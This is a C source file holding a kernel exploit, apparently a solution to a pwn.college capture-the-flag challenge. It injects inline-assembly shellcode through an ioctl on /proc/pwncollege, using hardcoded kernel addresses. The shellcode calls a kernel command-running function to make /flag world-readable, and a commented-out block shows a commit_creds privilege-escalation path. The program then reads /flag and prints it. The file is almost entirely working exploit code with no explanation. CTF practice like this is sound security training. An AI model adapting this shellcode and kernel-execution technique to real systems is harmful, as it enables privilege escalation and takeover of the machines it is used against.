#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>

#define IOCTL_CMD         0x539
#define RUNCMD_ADDR       0xffffffff81089b30
#define SC_START_ADDR     0xffffc90000085000

#define PREP_CRED_ADDR    0xffffffff81089660
#define COMMIT_CRED_ADDR  0xffffffff81089310


size_t shellcode(char** ptr) {
#define _ "\n\t"
    asm volatile(
        "lea rax, [rip+SC]"_
        "mov %0, rax"_       // ptr = &start_of_sc

        "lea rax, [SC_END - $ - 2]"_
        "leave"_
        "ret"_
/*
        "xor rdi, rdi"_
        "mov rax, %1"_
        "call rax"_

        "mov rdi, rax"_
        "mov rax, %2"_
        "call rax"_
        "ret"_
*/        
    "SC:"_
        "lea rdi, [rip+binsh]"_
        "mov rax, %1"_
        "call rax"_
        "ret"_

    "binsh:"_
        ".string \"/bin/chmod 007 /flag\""_


    "SC_END:"_
        "nop"_

        : "=m" (*ptr)
        : "i" (RUNCMD_ADDR), "i" (COMMIT_CRED_ADDR) 
        : "rax"
    );
#undef _

    return 0;
}

char arr[0x1008 + 8] = {0};

int main(int argc, char** argv)
{
    char* sc_ptr = NULL;
    size_t sc_len = shellcode(&sc_ptr);
    printf("Shellcode start: %p, len: %zu\n", sc_ptr, sc_len);

    memcpy(arr, &sc_len, 8);
    memcpy(arr+8, sc_ptr, sc_len);
    mempcpy(arr+0x1008, & (size_t) {SC_START_ADDR}, 8);
 
    int fd = open("/proc/pwncollege", O_RDWR);
    ioctl(fd, IOCTL_CMD, arr);

    sleep(1);
    fd = open("/flag", O_RDONLY);

    sendfile(STDOUT_FILENO, fd, 0, 128);
}
